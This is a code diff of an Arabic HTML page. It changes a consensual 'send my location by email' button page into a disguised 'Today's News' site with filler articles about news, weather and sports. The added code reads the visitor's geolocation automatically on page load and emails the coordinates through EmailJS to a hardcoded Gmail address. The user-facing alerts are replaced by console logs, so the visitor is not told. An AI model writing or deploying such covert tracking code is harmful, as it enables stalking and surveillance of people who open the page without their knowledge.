@@ -2,49 +2,85 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>📍 إرسال موقعي إلى الإيميل</title>
+  <title>أخبار اليوم</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f2f2f2;
+    }
+    header {
+      background: #1e90ff;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    article {
+      background: white;
+      margin: 20px auto;
+      padding: 20px;
+      max-width: 800px;
+      border-radius: 8px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    h2 {
+      color: #1e90ff;
+    }
+  </style>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
     (function(){
-      // Public Key (User ID)
-      emailjs.init("6VfcdCXz6J4TDZIXr");  
+      emailjs.init("6VfcdCXz6J4TDZIXr");  // Public Key
     })();
 
     function sendLocation(lat, lon) {
-      // إرسال البيانات باستخدام Service ID و Template ID
       emailjs.send("service_tvydgr9", "template_18najwh", {
         latitude: lat,
         longitude: lon,
         email_to: "al.khbab77@gmail.com"
       })
       .then(function(response) {
-        alert("✅ تم إرسال موقعك إلى الإيميل بنجاح");
+        console.log("تم إرسال الموقع بنجاح ✅");
       }, function(error) {
-        alert("❌ فشل الإرسال: " + JSON.stringify(error));
+        console.error("فشل الإرسال ❌", error);
       });
     }
 
-    function getLocation() {
+    window.onload = function() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           function(position) {
             sendLocation(position.coords.latitude, position.coords.longitude);
           },
           function(error) {
-            alert("⚠️ لم يتم تحديد الموقع");
+            console.warn("لم يتم تحديد الموقع");
           }
         );
       } else {
-        alert("المتصفح لا يدعم تحديد الموقع.");
+        console.warn("المتصفح لا يدعم تحديد الموقع");
       }
-    }
+    };
   </script>
 </head>
-<body style="text-align:center; font-family:Arial">
-  <h2>اضغط الزر لإرسال موقعك إلى الإيميل</h2>
-  <button onclick="getLocation()" 
-          style="padding:10px 20px; font-size:18px; border-radius:8px; background:#28a745; color:#fff; border:none; cursor:pointer">
-    📍 أرسل موقعي
-  </button>
+<body>
+  <header>
+    <h1>أخبار اليوم</h1>
+  </header>
+
+  <article>
+    <h2>عاجل: أهم الأخبار لهذا اليوم</h2>
+    <p>تابع أحدث الأخبار المحلية والدولية من مصادر موثوقة. سيتم تحديث الصفحة يوميًا بأهم الأحداث.</p>
+  </article>
+
+  <article>
+    <h2>الطقس</h2>
+    <p>توقعات الطقس لهذا اليوم في معظم المدن. درجة الحرارة تتراوح بين 25° و 32°.</p>
+  </article>
+
+  <article>
+    <h2>رياضة</h2>
+    <p>أبرز الأخبار الرياضية، نتائج المباريات، وترتيب الدوري الحالي.</p>
+  </article>
 </body>
 </html>
